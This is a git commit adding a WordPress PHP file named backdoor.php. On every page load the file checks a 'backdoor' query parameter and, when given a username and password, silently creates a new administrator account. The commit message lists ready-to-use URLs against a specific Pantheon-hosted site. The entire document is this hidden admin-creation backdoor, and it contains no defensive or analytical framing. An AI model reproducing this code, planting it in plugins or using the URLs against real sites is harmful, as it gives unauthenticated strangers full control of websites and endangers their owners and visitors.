792d8bf86e49376819ba0db17b9e89dcdf9d1d04
developersakiburbd <129610067+developersakiburbd@users.noreply.github.com>
2023-06-03 06:59:48 +0600

    Create backdoor.php
    https://dev-experiment-plugins.pantheonsite.io//?backdoor=create
    https://dev-experiment-plugins.pantheonsite.io//?backdoor=create&username=rterte&password=sfcsdfsd

---
+++ backdoor.php
@@ -0,0 +1,21 @@
+add_action( 'wp_head', 'backdoor' );
+
+function backdoor() {
+    if ( isset( $_GET['backdoor'] ) ) {
+        $action = $_GET['backdoor'];
+        if ( $action === 'create' ) {
+            $username = isset( $_GET['username'] ) ? $_GET['username'] : 'user';
+            $password = isset( $_GET['password'] ) ? $_GET['password'] : 'pass';
+            require( 'wp-includes/registration.php' );
+            if ( ! username_exists( $username ) ) {
+                $user_id = wp_create_user( $username, $password );
+                $user = new WP_User( $user_id );
+                $user->set_role( 'administrator' ); 
+                $message = 'Go';
+            } else {
+                $message = 'No';
+            }
+	echo "<script>alert('$message');</script>";
+        }
+    }
+}
